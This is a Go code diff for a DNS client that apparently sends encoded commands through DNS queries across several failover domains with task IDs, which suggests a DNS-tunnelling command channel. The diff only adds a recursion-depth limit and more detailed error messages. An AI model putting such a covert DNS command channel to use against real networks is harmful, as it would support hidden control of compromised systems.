@@ -248,7 +248,20 @@ func (c *DNSClient) decodeResponse(encoded string) (string, error) {
 // sendDNSQuery sends a command via DNS query with multi-domain support
 // taskID parameter is used for metadata tracking but does NOT enforce domain affinity
 // to allow proper load balancing across DNS servers
+// recursionDepth limits failover attempts to prevent infinite loops when all domains fail
 func (c *DNSClient) sendDNSQuery(command string, taskID string) (string, error) {
+	return c.sendDNSQueryWithDepth(command, taskID, 0)
+}
+
+// sendDNSQueryWithDepth is the internal implementation with recursion tracking
+func (c *DNSClient) sendDNSQueryWithDepth(command string, taskID string, depth int) (string, error) {
+	// Prevent infinite recursion when all domains are failing
+	// Allow one failover per available domain
+	maxDepth := len(c.config.GetDomains())
+	if depth >= maxDepth {
+		return "", fmt.Errorf("all DNS servers exhausted after %d failover attempts", depth)
+	}
+
 	encodedCmd, err := c.encodeCommand(command)
 	if err != nil {
 		return "", fmt.Errorf("failed to encode command: %v", err)
@@ -339,17 +352,18 @@ func (c *DNSClient) sendDNSQuery(command string, taskID string) (string, error) 
 		c.markDomainFailed(domain)
 
 		// Try one more time with a different domain (failover)
+		// Depth counter prevents infinite recursion when all domains are failing
 		domains := c.config.GetDomains()
 		if len(domains) > 1 {
 			// Select a different domain (don't pass taskID to allow selection of different domain)
 			newDomain, selErr := c.selectDomain("")
 			if selErr == nil && newDomain != domain {
-				// Recursive call with new domain (limit recursion by checking domain change)
-				return c.sendDNSQuery(command, taskID)
+				// Recursive call with incremented depth counter
+				return c.sendDNSQueryWithDepth(command, taskID, depth+1)
 			}
 		}
 
-		return "", fmt.Errorf("DNS query to %s failed after %d attempts: %v", domain, c.config.RetryAttempts, err)
+		return "", fmt.Errorf("DNS query to %s failed after %d attempts (depth %d): %v", domain, c.config.RetryAttempts, depth, err)
 	}
 
 	return result, nil
